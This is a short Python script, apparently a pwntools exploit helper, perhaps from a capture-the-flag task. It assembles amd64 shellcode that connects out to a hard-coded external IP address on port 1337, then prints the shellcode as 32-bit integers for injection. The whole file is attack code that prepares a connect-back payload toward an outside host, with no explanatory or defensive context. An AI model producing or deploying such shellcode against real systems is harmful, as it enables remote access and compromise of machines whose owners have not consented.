from pwn import *
from sys import *

context.arch = 'amd64'

sc = asm(shellcraft.connect('167.99.40.220', 1337))
print([u32(sc[i:i+4].ljust(4, b'\x00')) for i in range(0, len(sc), 4)])